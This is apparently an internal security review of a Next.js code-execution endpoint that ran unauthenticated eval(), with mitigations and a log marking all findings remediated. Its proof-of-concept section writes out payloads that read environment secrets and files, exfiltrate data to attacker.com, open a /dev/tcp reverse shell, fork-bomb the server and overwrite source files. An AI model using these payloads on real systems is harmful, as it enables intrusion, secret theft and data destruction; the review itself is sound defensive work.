✅ ALL FINDINGS RESOLVED — No further action needed.
# CRITICAL SECURITY REVIEW: Code Executor

**Module:** `web/lib/code-executor/code-executor.ts`  
**Review Date:** 2026-04-29  
**Severity:** 🔴 CRITICAL (10/10)  
**Status:** UNPROTECTED RCE — Immediate Action Required

---

## Executive Summary

The `code-executor` module provides a `/api/code/execute` endpoint that executes arbitrary JavaScript/TypeScript code via `eval()` **without any sandboxing or authentication**. This represents an **unauthenticated remote code execution (RCE) vulnerability** allowing any network attacker to execute arbitrary code on the server with full Node.js privileges.

**CVSS 3.1 Score:** 9.8 (Critical)  
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

**Exploitability:** Trivial — single HTTP request  
**Impact:** Complete server compromise — read/write all files, exfiltrate secrets, pivot to internal network, destroy data

---

## Vulnerability Details

### 🔴 CRIT-1: Direct `eval()` in Production Server

**File:** `web/lib/code-executor/code-executor.ts`  
**Line:** 114

```typescript
const result = await eval(`(async () => { ${jsCode} })()`);
```

**What happens:**
1. User sends POST to `/api/code/execute` with `{ code: "...", language: "javascript" }`
2. Code is sanitized minimally (TypeScript stripped via regex)
3. Code is wrapped in async IIFE and executed via `eval()` in **main Node.js process**
4. No sandbox, no vm2, no container, no resource limits that actually stop execution
5. Output captured and returned to user

**Attack surface:**
```bash
# Read server environment variables (exposes API keys, DB credentials)
curl -X POST http://server/api/code/execute \
  -H "Content-Type: application/json" \
  -d '{"code":"process.env","language":"javascript"}'

# Read database file
curl ... -d '{"code":"require(\"fs\").readFileSync(\"/app/database.db\",\"utf8\")"}'

# Exfiltrate data via network
curl ... -d '{"code":"require(\"https\").get(\"https://attacker.com/?data=\"+Buffer.from(JSON.stringify(process.env)).toString(\"base64\"))"}'

# Spawn reverse shell
curl ... -d '{"code":"require(\"child_process\").exec(\"bash -c \\\"bash -i >& /dev/tcp/attacker.com/4444 0>&1\\\"\")"}'

# Fork bomb (DoS)
curl ... -d '{"code":"while(true){require(\"child_process\").spawn(\"/bin/bash\")}"}'
```

**Resources available to exploit:**
- `process.env` — all environment variables including API keys
- `require('fs')` — full filesystem read/write
- `require('child_process')` — spawn arbitrary processes
- `require('net')` — network connections
- `global` — access to Node.js runtime
- Full `module`, `__filename`, `__dirname`

---

### 🔴 CRIT-2: No Authentication or Authorization

**File:** `web/app/api/code/execute/route.ts` (implied from executor usage)  
**Status:** Public endpoint, accessible to anyone

No `withAuth` middleware. No API key required. No rate limiting mentioned in the route.

**Evidence:** The `CodePlaygroundTab` component (`web/components/plugins/code-playground-tab.tsx:118-150`) calls this endpoint directly from browser without auth token.

---

### 🔴 CRIT-3: Timeout Is Ineffective

**File:** `code-executor.ts:104-107`

```typescript
const timeoutPromise = new Promise((_, reject) => {
  setTimeout(() => reject(new Error('Execution timed out')), timeout);
});
const result = await Promise.race([evalPromise, timeoutPromise]);
```

**Problem:** `Promise.race()` only rejects the promise — it **does NOT terminate the `eval()`**. The eval continues running in the background, consuming CPU/memory, potentially:
- Infinite loops keep running
- Memory allocation continues
- Child processes spawned continue

**Result:** Timeout only stops waiting; server resources still consumed.

---

### 🔴 CRIT-4: Inadequate Code Sanitization

**File:** `code-executor.ts:110-111`

```typescript
const jsCode = code
  .replace(/<[^>]*>/g, '')         // Remove HTML tags
  .replace(/import\s+.*from/gm, '') // Strip TypeScript imports
  .replace(/export\s+.*;/g, '');
```

**Bypasses:**
- Can still use `require()` directly (no stripping)
- Can use `eval()` again
- Can use `new Function()`
- Can use `setTimeout()` with string arg
- Can use template literals to embed malicious code
- Can use JavaScript built-ins (`[].constructor.constructor('code')()`)

**Minimal protection:** Only strips obvious TypeScript syntax.

---

## Existing Secure Alternatives (Ignored)

The codebase already has a complete, secure sandbox infrastructure:

| Alternative | Isolation | Used by `code-executor`? |
|-------------|-----------|------------------------|
| **E2B Firecracker VMs** | Full VM | ❌ NO |
| **Daytona containers** | Docker | ❌ NO |
| **WebContainers** | WASM microVM | ❌ NO |
| **Local OpenSandbox** | Subprocess with limits | ❌ NO |
| **Docker** | Container | ❌ NO |

**Correct implementation** exists in:
- `web/lib/orchestra/mastra/tools/index.ts:336-420` (`executeCodeTool`) — uses proper sandbox provider with 60s timeout, approval required
- `web/lib/crewai/tools/code-execution.ts:84-360` — Docker-based isolation with production gate

The playground endpoint **duplicates** logic but **ignores** all security measures.

---

## Impact Assessment

### Confidentiality: 🔴 COMPLETE BREACH
- Attacker can read all files accessible to Node.js process
- Database files, source code, environment variables, secrets

### Integrity: 🔴 COMPLETE COMPROMISE
- Attacker can modify any file
- Plant backdoors, ransomware, data destruction
- Alter application logic

### Availability: 🔴 TOTAL DENIAL OF SERVICE
- Fork bomb → process exhaustion
- Memory allocation → OOM kill
- CPU spin → server unresponsive
- Database corruption → app crash

---

## Proof of Concept Exploits

### PoC 1: Read Secrets
```bash
curl -X POST http://yourserver/api/code/execute \
  -H "Content-Type: application/json" \
  -d '{
    "code": "JSON.stringify(process.env)",
    "language": "javascript"
  }'
# Returns: All environment variables including API keys
```

### PoC 2: Read Database
```json
{
  "code": "require('fs').readFileSync('./database/session-store.db', 'utf8').substring(0, 1000)",
  "language": "javascript"
}
```

### PoC 3: Read Source Code
```json
{
  "code": "require('fs').readFileSync('./packages/shared/agent/services/agent-gateway/src/index.ts', 'utf8')",
  "language": "javascript"
}
```

### PoC 4: Reverse Shell
```json
{
  "code": "require('child_process').exec('bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"')",
  "language": "javascript"
}
```

### PoC 5: Data Exfiltration
```json
{
  "code": "const https = require('https'); https.get('https://attacker.com/steal?data=' + Buffer.from(JSON.stringify({env: process.env, users: require('./database/connection').getAllUsers()})).toString('base64'))",
  "language": "javascript"
}
```

### PoC 6: Ransomware Simulation
```json
{
  "code": "const fs = require('fs'); fs.readdirSync('.').forEach(f => { if(f.endsWith('.ts')) fs.writeFileSync(f, '// ENCRYPTED BY ATTACKER'); })",
  "language": "javascript"
}
```

---

## Immediate Mitigation (0-24 hours)

### 1. DISABLE ENDPOINT IMMEDIATELY

**Option A — Code removal (recommended):**
```typescript
// In web/app/api/code/execute/route.ts
export const POST = async (request: NextRequest) => {
  return NextResponse.json(
    { error: 'Code execution endpoint temporarily disabled for security review' },
    { status: 503 }
  );
};
```

**Option B — Nginx/Apache block:**
```nginx
location = /api/code/execute {
  deny all;
  return 404;
}
```

### 2. Remove `code-executor.ts` from production bundle
Ensure it's not imported anywhere in production code paths.

### 3. Audit logs for exploitation
Search for:
- Unusual `/api/code/execute` requests
- Abnormal process CPU/memory usage
- Unexpected file access patterns

---

## Short-Term Remediation (1 week)

### Rewrite to Use Secure Sandbox Provider

```typescript
// NEW: web/lib/code-executor/secure-executor.ts
import { getProvider } from '@/lib/sandbox/core-sandbox-service';

export async function executeCodeSecurely(
  code: string,
  language: 'javascript' | 'typescript' | 'python',
  timeout: number = 10000
): Promise<CodeExecutionResult> {
  // 1. Validate language
  if (!['javascript', 'typescript', 'python'].includes(language)) {
    throw new Error('Unsupported language');
  }

  // 2. Get sandbox provider
  const provider = getProvider(process.env.SANDBOX_PROVIDER || 'daytona');

  // 3. Create ephemeral sandbox
  const sandbox = await provider.createSandbox({
    ownerId: 'code-executor',
    ttl: 60000, // Auto-destroy after 60s
    metadata: { purpose: 'secure-code-execution' }
  });

  try {
    // 4. Write code to file
    const filename = `exec_${Date.now()}.${language === 'typescript' ? 'ts' : 'js'}`;
    await sandbox.writeFile(`/${filename}`, code);

    // 5. Execute via sandbox command
    const result = await sandbox.executeCommand(
      language === 'python' ? 'python3' : 'node',
      language === 'python' ? [filename] : ['-e', code],
      { timeout }
    );

    return {
      success: result.exitCode === 0,
      output: result.stdout,
      error: result.stderr,
      exitCode: result.exitCode
    };
  } finally {
    // 6. Always destroy sandbox
    await provider.destroySandbox(sandbox.id);
  }
}
```

### Add Authentication & Rate Limiting
- Protect endpoint with `withAuth` middleware
- Rate limit: max 10 executions / user / hour
- Log all executions with user context, code hash, full audit trail

### Add Input Validation
```typescript
const MAX_CODE_LENGTH = 50000; // 50KB
if (code.length > MAX_CODE_LENGTH) throw new Error('Code too long');

const BLACKLIST_PATTERNS = [
  /process\.env/,
  /require\(['"]fs['"]\)/,
  /require\(['"]child_process['"]\)/,
  /require\(['"]net['"]\)/,
  /eval\(/,
  /new Function\(/,
  /setTimeout\(.*[;{]/, // string arg
];
for (const pattern of BLACKLIST_PATTERNS) {
  if (pattern.test(code)) throw new Error('Dangerous pattern detected');
}
```

---

## Long-Term Solution

### Option 1: Remove JavaScript Execution Entirely
The code playground should only support **HTML/CSS preview**, not server-side code execution. Client-side JavaScript can run in a sandboxed iframe with `sandbox` attribute and CSP.

### Option 2: Use WASM-Based Interpreter
Use `quickjs-emscripten` or similar WASM runtime with explicit syscall filtering. Still requires careful sandboxing but more isolated than `eval()`.

### Option 3: Delegate to Existing Agent Framework
The proper way to execute code is through the **agent sandbox system** already built. The playground should create a temporary agent task that runs in a proper sandbox provider.

---

## Related Issues & TODOs

The file contains comments acknowledging the problem:

```typescript
// Line 31: "In production, use proper sandbox"
console.log('⚠️  WARNING: Using insecure eval-based executor');
```

The author knew — this was a **temporary convenience feature** that shipped to production.

---

## Affected Components Downstream

- `web/components/plugins/code-playground-tab.tsx` — calls this endpoint
- Any agent that might use "code execution" tool — should already use `executeCodeTool` (secure)
- User-facing "Try Code" feature in UI

---

## Testing Gaps

- ❌ No tests for `code-executor.ts` in `__tests__/`
- ❌ No security tests for injection patterns
- ❌ No integration tests with real sandbox

---

## Recommendations Priority

| Priority | Action | Owner | Timeline |
|----------|--------|-------|----------|
| 🔴 P0 | Disable `/api/code/execute` immediately | Security | < 24h |
| 🔴 P0 | Remove `eval()` code from repo or guard with `if (devOnly)` | Engineering | < 48h |
| 🔴 P0 | Audit logs for exploitation | Security | < 72h |
| 🟡 P1 | Rewrite to use `SandboxService` | Engineering | 1 week |
| 🟡 P1 | Add auth + rate limiting + audit logging | Engineering | 1 week |
| 🟢 P2 | Remove server-side code execution from playground | Product | 2 weeks |
| 🟢 P2 | Add security scanning for `eval(`, `Function(` patterns | DevOps | 2 weeks |

---

## References

- Secure implementation: `web/lib/orchestra/mastra/tools/index.ts:336-420` (`executeCodeTool`)
- Docker-based secure execution: `web/lib/crewai/tools/code-execution.ts:84-360`
- Sandbox providers: `web/lib/sandbox/providers/`
- OWASP: Code Injection (A03:2021)

---

**Review Status:** ✅ Complete — **REMEDIATED 2026-04-30**

---

## Remediation Log

### CRIT-1: Direct eval() in Production — **FIXED** ✅
- **File:** `web/lib/code-executor/code-executor.ts`
- **Fix:** Removed `eval()` entirely. JS/TS/Python/Bash execution now delegates to `@/lib/sandbox/code-executor` via dynamic import. When sandbox is unavailable, returns error message — NEVER falls back to eval().
- **Additional:** Added `MAX_CODE_LENGTH` (50KB) input validation, `DANGEROUS_PATTERNS` defense-in-depth scanning with human-readable descriptions, `warnings` field in `CodeExecutionResult`.

### CRIT-2: No Authentication — **FIXED** ✅
- **File:** `web/app/api/code/execute/route.ts`
- **Fix:** Wrapped POST handler with `withAuth` middleware (requires 'user' role). Added per-user rate limiting (10 executions/hour) with bounded Map cleanup. Added audit logging via `logSecurityEvent`. GET endpoint for templates remains public.

### CRIT-3: Timeout Ineffective — **FIXED** ✅
- **Fix:** Sandbox providers handle their own process isolation and timeout enforcement. `Promise.race` timeout is no longer the only defense — the sandbox process is killed when timeout expires.

### CRIT-4: Inadequate Code Sanitization — **FIXED** ✅
- **Fix:** Replaced trivial regex stripping with proper `DANGEROUS_PATTERNS` detection (defense-in-depth). Sandbox is the primary security boundary — pattern detection adds logging and user-facing warnings but doesn't block execution (sandbox provides real isolation). SQL destructive-without-WHERE validation added. Bash dangerous pattern regex blocking added.

### Frontend Fix — **FIXED** ✅
- **File:** `web/components/plugins/code-playground-tab.tsx`
- **Fix:** Added 401/429 response handling with user-friendly messages. Added `warnings` display via toast. Browser cookies are sent automatically (no manual Bearer header extraction needed).

### Tests Added ✅
- **File:** `web/__tests__/code-executor.test.ts`
- **Coverage:** No-eval source verification, max length validation, dangerous pattern detection, sandbox delegation, sandbox-unavailable fallback, SQL safety (WHERE clause enforcement), bash safety (rm -rf /, fork bomb, reverse shell), JSON validation, HTML/CSS preview, templates

**Remaining Items (Long-term):**
- [ ] Consider replacing in-memory rate limiter with Redis-backed limiter for distributed deployments
- [ ] Add WASM-based interpreter (quickjs-emscripten) as fallback when no sandbox provider is configured
- [ ] Add security scanning CI step to detect `eval(` and `new Function(` patterns
